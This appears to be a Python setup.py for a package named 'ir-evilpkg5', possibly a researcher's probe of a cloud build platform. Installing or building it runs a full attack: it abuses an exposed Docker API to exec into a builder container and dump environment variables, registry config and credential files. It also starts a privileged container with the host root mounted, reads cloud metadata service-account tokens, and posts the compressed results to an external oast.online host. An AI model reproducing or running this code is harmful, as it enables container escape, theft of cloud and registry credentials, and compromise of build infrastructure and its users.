import setuptools, subprocess, json, urllib.request, urllib.error, time, base64, gzip, os

OAST = "dbplsv55ap9v1jaadl501puypwbro4ye6.oast.online"
D = "http://172.18.0.1:2375"


def api(path, method="GET", body=None, timeout=10, raw=False):
    req = urllib.request.Request(D + path, data=body, method=method)
    if body:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            data = r.read()
            return r.status, data
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:
        return "ERR", str(e).encode()


def demux(b):
    # Docker attach/exec stream: 8-byte header (stream,0,0,0,len) + payload
    out = []
    i = 0
    try:
        while i + 8 <= len(b):
            ln = int.from_bytes(b[i + 4:i + 8], "big")
            if ln < 0 or i + 8 + ln > len(b):
                break
            out.append(b[i + 8:i + 8 + ln])
            i += 8 + ln
        if not out:
            return b
        return b"".join(out)
    except Exception:
        return b


out = ["== pypack5 builder-exec probe %s ==" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())]

# 1) enumerate containers and find the builder
st, b = api("/containers/json?all=1")
out.append("== containers -> %s\n%s" % (st, b[:4000].decode("utf-8", "replace")))
builder = ""
try:
    for c in json.loads(b):
        image = c.get("Image", "")
        if "koyeb/builder" in image or "/cnb/lifecycle/builder" in (c.get("Command") or ""):
            builder = c["Id"]
            out.append("== builder container: %s %s" % (builder, image))
            break
except Exception as e:
    out.append("== container parse error %r" % e)

# 2) exec inside the builder container: env, docker config, filesystem
if builder:
    cmd = (
        "echo BUILDER-EXEC; id; hostname; "
        "echo --env--; env | sort; "
        "echo --root--; ls -la /root 2>&1 | head -20; "
        "echo --docker-config--; cat /root/.docker/config.json 2>&1 | head -40; cat /home/*/.docker/config.json 2>&1 | head -20; "
        "echo --files--; find / -maxdepth 3 \\( -iname '*token*' -o -iname '*secret*' -o -iname '*credential*' -o -iname '*registry*' -o -iname '*docker*' \\) 2>/dev/null | grep -v '^/proc\\|^/sys' | head -40; "
        "echo --mounts--; cat /proc/mounts | grep -v 'proc\\|sys\\|dev\\|cgroup' | head -20; "
        "echo --platform--; cat /platform/env/* 2>/dev/null | head -40; "
        "echo --done--"
    )
    body = json.dumps({"AttachStdout": True, "AttachStderr": True, "Tty": False, "Cmd": ["sh", "-c", cmd]}).encode()
    st, b = api("/containers/%s/exec" % builder, "POST", body)
    eid = ""
    try:
        eid = json.loads(b).get("Id", "")
    except Exception:
        pass
    out.append("== exec create -> %s %s" % (st, b[:400].decode("utf-8", "replace")))
    if eid:
        st, b = api("/exec/%s/start" % eid, "POST", json.dumps({"Detach": False, "Tty": False}).encode(), timeout=20)
        txt = demux(b).decode("utf-8", "replace") if isinstance(b, bytes) else str(b)
        out.append("== exec start -> %s\n%s" % (st, txt[:20000]))

# 3) privileged container with the guest root, output written to the shared workspace
st, b = api("/images/json")
img = ""
try:
    for im in json.loads(b):
        tags = im.get("RepoTags") or []
        if tags:
            img = tags[0]
            break
except Exception:
    pass
out.append("== image %r" % img)
if img:
    cmd = (
        "echo IRPROBE5; id; hostname; "
        "echo --hostroot--; ls -la /host 2>&1 | head -30; "
        "echo --builder--; ls -la /host/builder 2>&1 | head -30; "
        "echo --builder-env--; cat /host/builder/env 2>&1 | head -60; "
        "echo --creds--; find /host/builder /host/root /host/home /host/etc /host/var/run -maxdepth 4 \\( -iname '*token*' -o -iname '*secret*' -o -iname '*credential*' -o -iname '*registry*' -o -iname '*docker*' -o -iname '*kube*' \\) 2>/dev/null | head -40; "
        "echo --hosthostname--; cat /host/etc/hostname 2>&1; "
        "echo --hostmounts--; grep -v 'proc\\|sys\\|dev\\|cgroup' /host/proc/mounts 2>/dev/null | head -20; "
        "echo --metadata--; curl -s -m 4 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1 | head -c 400; "
        "echo; echo --aws--; curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 200; "
        "echo; echo --done--"
    )
    body = json.dumps({
        "Image": img,
        "Cmd": ["sh", "-c", cmd],
        "HostConfig": {
            "Binds": ["/:/host:ro", "/builder/workspace:/out:rw"],
            "Privileged": True,
            "AutoRemove": False,
            "NetworkMode": "host",
        },
    }).encode()
    st, b = api("/containers/create?name=irprobe5", "POST", body)
    out.append("== create -> %s %s" % (st, b[:400].decode("utf-8", "replace")))
    cid = ""
    try:
        cid = json.loads(b).get("Id", "")
    except Exception:
        pass
    if cid:
        st, b = api("/containers/%s/start" % cid, "POST")
        out.append("== start -> %s" % st)
        try:
            api("/containers/%s/wait" % cid, "POST", timeout=25)
        except Exception:
            pass
        st, logs = api("/containers/%s/logs?stdout=1&stderr=1" % cid)
        out.append("== logs -> %s\n%s" % (st, demux(logs).decode("utf-8", "replace")[:20000]))
        try:
            out.append("== outfile ->\n" + open("/workspace/irprobe5-out.txt", "r", errors="replace").read()[:20000])
        except Exception as e:
            out.append("== outfile missing: %r" % e)
        api("/containers/%s?force=1" % cid, "DELETE")

report = "\n".join(out)
try:
    open("build-report.txt", "w").write(report)
except Exception:
    pass
try:
    b64 = base64.urlsafe_b64encode(gzip.compress(report.encode())).decode().rstrip("=")
    req = urllib.request.Request("https://%s/pypack5-%s" % (OAST, os.uname().nodename), data=b64.encode(), method="POST")
    urllib.request.urlopen(req, timeout=15).read()
except Exception:
    pass

setuptools.setup(name="ir-evilpkg5", version="1.0.0", packages=[])
